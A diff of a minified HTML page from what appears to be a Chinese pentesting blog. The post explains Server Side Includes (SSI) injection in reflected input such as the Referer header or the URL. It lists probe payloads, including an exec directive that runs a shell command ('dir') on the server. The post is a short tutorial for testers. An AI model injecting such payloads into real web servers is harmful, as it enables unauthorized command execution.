@@ -1,137 +1,26 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>SSI 注入 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>SSI 注入</h1>
-      
-<div class="post-meta">
-    <time>2017-06-08</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SSI%E6%B3%A8%E5%85%A5">SSI注入</a>)
-</div>
-
-      <div><h3 id="0x00-ssi">0x00 SSI</h3>
-<p>SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p>
-<p>在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞</p>
-<p>若注入点在url中则可能需要进行url编码</p>
-<h3 id="0x01-payload">0x01 payload</h3>
-<pre tabindex="0"><code>&#34;--&gt;&#39;--&gt;`--&gt;&lt;!--#set var=&#34;a&#34; value=&#34;123&#34;--&gt;&lt;!--#set var=&#34;b&#34; value=&#34;654&#34;--&gt;&lt;!--#echo var=&#34;a&#34;--&gt;&lt;!--#echo var=&#34;b&#34;--&gt;
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>SSI 注入 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>SSI 注入</h1><div class=post-meta><time>2017-06-08</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/SSI%E6%B3%A8%E5%85%A5>SSI注入</a>)</div><div><h3 id=0x00-ssi>0x00 SSI</h3><p>SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p><p>在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞</p><p>若注入点在url中则可能需要进行url编码</p><h3 id=0x01-payload>0x01 payload</h3><pre tabindex=0><code>&#34;--&gt;&#39;--&gt;`--&gt;&lt;!--#set var=&#34;a&#34; value=&#34;123&#34;--&gt;&lt;!--#set var=&#34;b&#34; value=&#34;654&#34;--&gt;&lt;!--#echo var=&#34;a&#34;--&gt;&lt;!--#echo var=&#34;b&#34;--&gt;
 
 &lt;!--#echo var=&#34;DATE_LOCAL&#34; --&gt;
 
 &lt;!--#exec cmd=&#34;dir&#34; --&gt;
-</code></pre><h3 id="0x02-示例">0x02 示例</h3>
-<ul>
-<li>Referer被输出到了页面中</li>
-</ul>
-<p><img src="/img/post/ssi_in_referer_request.png" alt="ssi漏洞"></p>
-<p><img src="/img/post/ssi_in_referer_response.png" alt="ssi漏洞"></p>
-<ul>
-<li>url中的数据被输出到页面中(有时候url中的payload需要url编码)</li>
-</ul>
-<p><img src="/img/post/ssi_in_url_request.png" alt="ssi漏洞"></p>
-<p><img src="/img/post/ssi_in_url_response.png" alt="ssi漏洞"></p>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre><h3 id=0x02-示例>0x02 示例</h3><ul><li>Referer被输出到了页面中</li></ul><p><img src=/img/post/ssi_in_referer_request.png alt=ssi漏洞></p><p><img src=/img/post/ssi_in_referer_response.png alt=ssi漏洞></p><ul><li>url中的数据被输出到页面中(有时候url中的payload需要url编码)</li></ul><p><img src=/img/post/ssi_in_url_request.png alt=ssi漏洞></p><p><img src=/img/post/ssi_in_url_response.png alt=ssi漏洞></p></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
